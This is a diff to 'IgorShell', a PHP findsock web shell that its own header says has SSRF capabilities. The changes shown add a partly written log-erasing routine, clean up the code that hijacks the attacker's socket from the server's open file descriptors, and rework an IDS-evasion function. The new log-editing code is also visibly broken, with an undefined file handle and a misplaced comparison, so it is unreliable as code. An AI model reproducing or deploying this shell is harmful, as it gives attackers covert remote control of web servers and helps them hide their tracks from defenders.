@@ -2,7 +2,7 @@
 
 /*
  *    IgorShell, findsock php statefull shell with ssrf capabilities.
- *    Author: Captain
+ *    Author: Captain, Mantis
  *    Date: 05-08-2013
  *    Dependancies: PHP >= 5.3.6
  */
@@ -24,6 +24,9 @@ class IgorShell {
     private $m_BossIp;
     private $m_BossPort;
     private $m_BossSock;
+    private $m_TimeStart;
+    private $m_TimeEnd;
+
 
     public function __construct() {
         $this->m_Pid             = getmypid();
@@ -31,6 +34,7 @@ class IgorShell {
         $this->m_FileDescriptors = array();
         $this->m_BossIp          = $_SERVER['REMOTE_ADDR'];
         $this->m_BossPort        = $_SERVER['REMOTE_PORT'];
+        $this->m_TimeStart       = time();
     }
 
     /**
@@ -99,15 +103,12 @@ class IgorShell {
     }
 
     public function printFileDescriptors(  ) {
-
         if(!$this->m_FileDescriptors){
             $this->getFileDescriptors();
         }
-
         foreach ( $this->m_FileDescriptors as $id => $fd ) {
             echo 'FD #' . $id . ': ' . print_r( $fd, true ) . '<br />';
         }
-
         echo "<hr/>".print_r($this->m_FileDescriptors, true).'<br/>';
     }
 
@@ -166,6 +167,26 @@ class IgorShell {
      */
     private function editLog( $fd = null ) {
         // TODO: implement me.
+        $this->m_TimeEnd = time();
+        $timeStart = date('M  d H:i:s', $this->m_TimeStart);
+
+        $logFileName = ''; // Filename?
+        $fh = fopen($fh, 'r+');
+        if(!$fh){
+            return false;
+        }
+        $logResult = '';
+        while(($line = fgets($fh) !== false)){
+            if(feof($fh)){
+                return false;
+            }
+            // if(preg_match('/^([A-Za-z]{1,3}(\s|\t)+[0-9]{1,2}(\t|\s)+[0-9\:]{0,3}+)(.?*)$/', $line, $matches)){
+                if(false !== substr($line, 0)){
+                    $line = '';
+                }
+            // }
+            $logResult .= $line;
+        }
     }
 
     /**
@@ -176,7 +197,6 @@ class IgorShell {
         if(!$this->m_FileDescriptors){
             $this->getFileDescriptors();
         }
-        var_dump($this->m_FileDescriptors);
         if(!empty($this->m_FileDescriptors)){
             foreach( $this->m_FileDescriptors as $id => $d ) {
 
@@ -186,12 +206,10 @@ class IgorShell {
                 }
 
                 $remote = stream_socket_get_name($d['fd'], true);
-                var_dump($remote);
                 if( $remote == $this->m_BossIp . ':' . $this->m_BossPort) {
 
                     // Sock found!
                     $this->m_BossSock = $d['fd'];
-                    var_dump($d);
 
                     if( is_resource($this->m_BossSock) )
                         echo 'Found socket!\n';
@@ -259,23 +277,22 @@ class IgorShell {
             sleep(1000);
         }
     }
+
     public function evadeIDS($arg, $count = false){
-        $output = null;
         switch(strtolower(gettype($arg))){
             case 'string':
                 $strlen = strlen($arg);
                 // 255 - strlen to ensure it will work on most/all varchar fields
-                $output = $this->randCode(rand(0, (255-$strlen)));
+                $arg = $this->randCode(rand(0, (255-$strlen)));
                 break;
 
             case 'boolean':
             case 'integer':
             default:
-                $output = rand(1, 32);
+                $arg = rand(1, 32);
                 break;
-
         }
-        return $output;
+        return $arg;
     }
 
     public function getRemoteFile($host, $directory, $filename, &$errstr, &$errno, $port=80, $timeout=10) {
@@ -336,7 +353,8 @@ class IgorShell {
         $password = NULL;
         $possible = 'bcdfghjkmnrstvwxyz123456789';
         $i = 0;
-        while(($i < $maxLength) && (strlen($possible) > 0)){ $i++;
+        while(($i < $maxLength) && (strlen($possible) > 0)){
+            $i++;
             $character = substr($possible, mt_rand(0, strlen($possible)-1), 1);
             $password .= $character;
         }
